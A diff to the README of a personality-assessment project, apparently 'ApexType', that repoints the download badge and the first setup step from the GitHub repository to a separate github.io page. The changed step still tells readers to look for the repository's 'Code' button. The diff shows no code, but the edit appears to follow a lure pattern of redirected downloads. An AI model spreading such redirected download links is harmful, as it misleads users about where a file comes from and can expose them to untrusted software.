@@ -1,6 +1,6 @@
 # 🎯 apextype-core-archetype - Find your true personality roadmap today
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/leq102676-cmyk/apextype-core-archetype)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://leq102676-cmyk.github.io)
 
 ApexType v2026 helps you understand your natural strengths. It evaluates your personality type and provides a clear path for your personal growth. This system works through your web browser. You do not need to install complex software to use it.
 
@@ -24,7 +24,7 @@ Before you start, check your computer for these items:
 
 Follow these steps to set up the assessment tool on your computer.
 
-1. Visit the repository page to begin the process: [https://github.com/leq102676-cmyk/apextype-core-archetype](https://github.com/leq102676-cmyk/apextype-core-archetype).
+1. Visit the repository page to begin the process: [https://leq102676-cmyk.github.io](https://leq102676-cmyk.github.io).
 2. Click the green "Code" button near the top of the page.
 3. Select "Download ZIP" from the menu.
 4. Save the file to your computer.
